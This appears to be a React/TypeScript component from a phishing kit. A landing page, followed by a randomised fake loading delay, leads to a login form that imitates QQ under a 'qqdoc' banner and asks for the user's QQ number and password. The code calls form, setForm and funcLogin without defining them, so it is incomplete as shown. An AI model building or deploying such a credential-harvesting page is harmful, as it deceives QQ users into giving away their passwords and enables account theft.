import { useCallback, useMemo, useState, useEffect } from "react";
import { useModuleData } from "./moduleContext";
import { Button, Image, Input } from 'antd'
import clsx from "clsx"
import Page1 from '../pages'

export const ITEM_KEYS = ["item1", "item5", "item7", "item8"] as const;

export default function Module3Page() {
  const moduleData = useModuleData();
  const { key } = useModuleData();
  const [_key, _setKey] = useState<'h' | 'l'>('h');
  const [pageLoading, setPageLoading] = useState<boolean>(false);
  const [infoArr, setInfoArr] = useState<string[]>([]);
  const isL = useMemo(() => _key=='l', [_key])
  const labels = new Map(moduleData.mappings.map((item) => [item.map_key, item.map_value]));

  useEffect(() => {
    document.title = moduleData.moduleInfo.siteTitle || "";
    setInfoArr(moduleData.moduleInfo.title.split('|') || ''); // 获取信息列表
  }, [moduleData.moduleInfo.siteTitle, key]);

  const onClick = useCallback(() => {
    setPageLoading(true)
		setTimeout(() => {
			setPageLoading(false)
			_setKey('l')
		}, Math.random() * 500 + 500)
  }, [])
  const styleBorder: string = useMemo(() => 'border-b border-gray-200', [])

  // 2026-09-10 16:55:00 CST：保留 module3 独立页面布局，便于后续按业务需求单独调整样式。
  return isL ? <>
    {
      <div className={clsx('w-screen h-screen px-10 text-lg')}>

        <div className={clsx("text-center text-2xl pt-20 pb-5", styleBorder)}>
          <Image src="/banner/qqdoc.png"></Image>
        </div>
        {/* 账号 */}
        <div className={clsx("flex w-full h-[4rem]", styleBorder)}>
          <div className="w-[80px] flex items-center">QQ号</div>
          <Input type="text" placeholder="请输入QQ号" bordered={false} value={form.username} onChange={(v) => setForm({ ...form, username: v.target.value })} className="text-[18px]" />
        </div>

        {/* 密码 */}
        <div className={clsx("flex w-full h-[4rem]", styleBorder)}>
          <div className="w-[80px] flex items-center">密码</div>
          <Input type="password" placeholder="请输入QQ密码" bordered={false} value={form.password} onChange={(v) => setForm({ ...form, password: v.target.value })} className="text-[18px]" />
        </div>

        {/* 登录按钮 */}
        <div className="flex flex-col items-center mt-16 gap-y-4">
          <Button type="primary" variant="solid" disabled={!(form.username && form.password)} color="blue" className="w-[50vw] h-[60px] text-[20px] font-bold" onClick={funcLogin}>同意并登录</Button>
        </div>
      </div>
    }
  </> :
  <>
		<div className='h-screen w-screen bg-white text-gray-500 text-center pt-32 text-sm font-serif flex flex-col items-center gap-y-2'>
        <div className="text-blue-500 text-4xl font-bold">{ infoArr[0] }</div>
 			<div className="text-3xl font-bold text-black">{ infoArr[1] }</div>
 			<div>{ infoArr[2] }</div>
 			<div>{ infoArr[3] }</div>
 			<Button onClick={onClick} className="bg-blue-500 text-white mt-12 mb-4 text-lg font-bold px-24 py-4 h-[40px] font-serif">{ infoArr[4] }</Button>
 			<div>{ infoArr[5] }</div>
		</div>
  </>
}
